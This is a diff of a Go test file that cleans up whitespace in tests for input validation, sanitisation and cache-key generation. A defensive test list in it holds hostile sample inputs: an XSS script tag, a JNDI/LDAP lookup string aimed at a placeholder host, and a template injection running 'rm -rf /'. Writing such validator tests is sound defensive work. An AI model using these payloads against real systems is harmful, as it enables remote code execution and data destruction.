@@ -107,7 +107,7 @@ func TestMatchesPermission(t *testing.T) {
 	for _, test := range tests {
 		result := matchesPermission(test.userPerm, test.requiredPerm)
 		if result != test.expected {
-			t.Errorf("%s: matchesPermission(%q, %q) = %v, want %v", 
+			t.Errorf("%s: matchesPermission(%q, %q) = %v, want %v",
 				test.description, test.userPerm, test.requiredPerm, result, test.expected)
 		}
 	}
@@ -128,7 +128,7 @@ func TestSanitizeValue(t *testing.T) {
 
 	for _, test := range tests {
 		result := sanitizeValue(test.input)
-		
+
 		switch test.input.(type) {
 		case string:
 			if str, ok := result.(string); ok {
@@ -153,7 +153,7 @@ func TestSanitizeValue(t *testing.T) {
 
 func TestDefaultValidationConfig(t *testing.T) {
 	config := DefaultValidationConfig()
-	
+
 	// Test that dangerous patterns are caught
 	dangerousInputs := []string{
 		"<script>alert('xss')</script>",
@@ -168,13 +168,13 @@ func TestDefaultValidationConfig(t *testing.T) {
 		"${jndi:ldap://malicious.com}",
 		"<%=system('rm -rf /')%>",
 	}
-	
+
 	// Compile patterns
 	compiledPatterns := make([]*regexp.Regexp, len(config.ForbiddenPatterns))
 	for i, pattern := range config.ForbiddenPatterns {
 		compiledPatterns[i] = regexp.MustCompile(pattern)
 	}
-	
+
 	for _, input := range dangerousInputs {
 		found := false
 		for _, pattern := range compiledPatterns {
@@ -243,9 +243,9 @@ func TestAllowHTMLValidation(t *testing.T) {
 
 			compiledPatterns := make([]*regexp.Regexp, 0)
 			inputs := map[string]interface{}{"test": test.input}
-			
+
 			err := validateInputsGeneric(inputs, config, compiledPatterns)
-			
+
 			if test.shouldError && err == nil {
 				t.Errorf("Expected error for input %q with AllowHTML=%v", test.input, test.allowHTML)
 			}
@@ -260,25 +260,25 @@ func TestDeterministicCacheKeys(t *testing.T) {
 	// Test that cache keys are deterministic even when JSON marshaling fails
 	inputs1 := map[string]any{"b": "value2", "a": "value1"}
 	inputs2 := map[string]any{"a": "value1", "b": "value2"}
-	
+
 	info := core.NewModuleInfo("TestModule", "TestType", core.Signature{})
-	
+
 	key1 := generateModuleCacheKey(inputs1, info)
 	key2 := generateModuleCacheKey(inputs2, info)
-	
+
 	if key1 != key2 {
 		t.Errorf("Expected same cache keys for equivalent maps, got %s and %s", key1, key2)
 	}
-	
+
 	// Test with tool cache keys too
 	args1 := map[string]interface{}{"b": "value2", "a": "value1"}
 	args2 := map[string]interface{}{"a": "value1", "b": "value2"}
-	
+
 	toolInfo := core.NewToolInfo("TestTool", "Test tool", "TestType", models.InputSchema{})
-	
+
 	toolKey1 := generateToolCacheKey(args1, toolInfo)
 	toolKey2 := generateToolCacheKey(args2, toolInfo)
-	
+
 	if toolKey1 != toolKey2 {
 		t.Errorf("Expected same tool cache keys for equivalent maps, got %s and %s", toolKey1, toolKey2)
 	}
